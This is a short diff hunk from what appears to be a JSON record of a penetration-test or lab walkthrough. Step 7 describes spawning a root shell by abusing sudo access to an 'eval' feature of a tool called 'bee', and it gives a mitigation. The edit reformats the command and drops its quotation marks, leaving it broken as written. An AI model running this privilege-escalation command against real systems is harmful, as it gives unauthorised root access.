@@ -5625,7 +5625,7 @@
             "step": 7,
             "user": "root",
             "technique": "Arbitrary Code Execution via eval",
-            "description": "Executed the following command to spawn a root shell:\n```bash\nsudo /usr/local/bin/bee eval 'system("/bin/bash");'\n```",
+            "description": "Executed the following command to spawn a root shell: bash sudo /usr/local/bin/bee eval 'system(/bin/bash);'",
             "mitigation": "Restrict and audit use of eval functionality. Enforce proper input validation."
         },
         {
